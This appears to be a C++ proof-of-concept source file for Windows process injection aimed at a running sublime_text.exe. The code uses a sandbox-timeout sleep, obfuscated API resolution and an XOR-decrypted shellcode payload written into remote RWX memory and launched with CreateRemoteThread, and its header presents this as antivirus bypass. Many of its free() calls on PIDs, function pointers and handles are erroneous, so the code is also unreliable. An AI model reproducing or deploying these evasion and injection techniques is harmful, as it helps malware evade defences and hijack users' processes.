/*
	Author:		lemur
	Email:		1emvr@protonmail.com
	GitHub:		https://github.com/1emvr/
	Date:		01.12.2023		05:08 AM

	Cpp process injection proof of concept (calc.exe)
	
	AV bypass and obfuscation techniques such as XOR cipher payload, 
	API call obfuscation, string obfuscation and sandbox timeout
	
	Prototype definitions: 
	https://learn.microsoft.com/en-us/windows/win32/api

*/
#include <stdio.h>
#include <Windows.h>
#include <TlHelp32.h>
#include <memoryapi.h>

#include <string>
#include <cstdint>
#include <iostream>

#include "resource.h"
using namespace std;

DWORD GetProcessId(wstring processName) {
	
	PROCESSENTRY32 processEntryList;
	processEntryList.dwSize = sizeof(PROCESSENTRY32);

	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	
	if (hSnapshot == INVALID_HANDLE_VALUE) {
		return 0;
	}
	Process32First(hSnapshot, &processEntryList);
	if (!processName.compare(processEntryList.szExeFile)) {
		CloseHandle(hSnapshot);
		return processEntryList.th32ProcessID;
	}
	while (Process32Next(hSnapshot, &processEntryList)) {
		if (!processName.compare(processEntryList.szExeFile)) {
			CloseHandle(hSnapshot);
			return processEntryList.th32ProcessID;
		}
	}
	CloseHandle(hSnapshot);
	return 0;
}

int main(void) {

	Sleep(5000);
	wstring processName = L"sublime_text.exe";
	
	DWORD pid = GetProcessId(processName);
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, TRUE, pid);
	free((DWORD*)pid);

	HMODULE hFunctionCall = LoadLibrary((LPCWSTR)sKernel32);

	pVirtualAllocEx = (VirtualAllocEx_t)GetProcAddress(hFunctionCall, (LPCSTR)sVirtualAllocEx);
	LPVOID pRemoteShellcode = VirtualAllocEx(hProcess, NULL, payloadLen, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	free((VirtualAllocEx_t)pVirtualAllocEx);
	free(sVirtualAllocEx);

	u_char hPayload = XorCipher(payload, payloadLen, key, keylen);	
	pWriteProcessMemory = (WriteProcessMemory_t)GetProcAddress(hFunctionCall, (LPCSTR)sWriteProcessMemory);
	pWriteProcessMemory(hProcess, pRemoteShellcode, (LPCVOID)hPayload, payloadLen, NULL);
	
	free((WriteProcessMemory_t)pWriteProcessMemory);
	free(sVirtualAllocEx);
	free((u_char*)hPayload);
	free(payload);
	free(key);

	pCreateRemoteThread = (CreateRemoteThread_t)GetProcAddress(hFunctionCall, (LPCSTR)sCreateRemoteThread);
	HANDLE hThread = pCreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteShellcode, NULL, 0, NULL);
	free((CreateRemoteThread_t)pCreateRemoteThread);

	CloseHandle(hProcess);
	free(hThread);
	return 0;
}
